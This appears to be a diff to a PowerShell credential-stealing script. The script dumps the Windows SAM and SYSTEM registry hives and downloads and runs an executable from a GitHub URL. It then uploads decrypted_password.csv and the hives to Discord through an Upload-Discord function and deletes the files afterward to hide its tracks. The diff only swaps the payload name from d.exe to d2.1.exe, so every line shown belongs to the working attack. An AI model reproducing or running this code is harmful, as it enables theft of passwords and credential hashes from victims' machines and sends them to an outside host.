@@ -2,8 +2,8 @@ cd $env:TMP
 reg save HKLM\sam ./sam.save
 reg save HKLM\system ./system.save
 
-iwr https://github.com/skekic16/lol/raw/main/d.exe?dl=1 -O $Env:TMP\d.exe
-Start-process "$env:TMP\d.exe"
+iwr https://github.com/skekic16/lol/raw/main/d2.1.exe?dl=1 -O $Env:TMP\d2.1.exe
+Start-process "$env:TMP\d2.1.exe"
 start-sleep 5
 function Upload-Discord {
 
@@ -31,6 +31,6 @@ Upload-Discord -file $env:TMP\decrypted_password.csv
 Upload-Discord -file $env:TMP\sam.save
 Upload-Discord -file $env:TMP\system.save
 rm "$env:TMP\decrypted_password.csv" -r -Force -ErrorAction SilentlyContinue
-rm "$env:TMP\d.exe" -r -Force -ErrorAction SilentlyContinue
+rm "$env:TMP\d2.1.exe" -r -Force -ErrorAction SilentlyContinue
 rm "$env:TMP\sam.save" -r -Force -ErrorAction SilentlyContinue
 rm "$env:TMP\system.save" -r -Force -ErrorAction SilentlyContinue
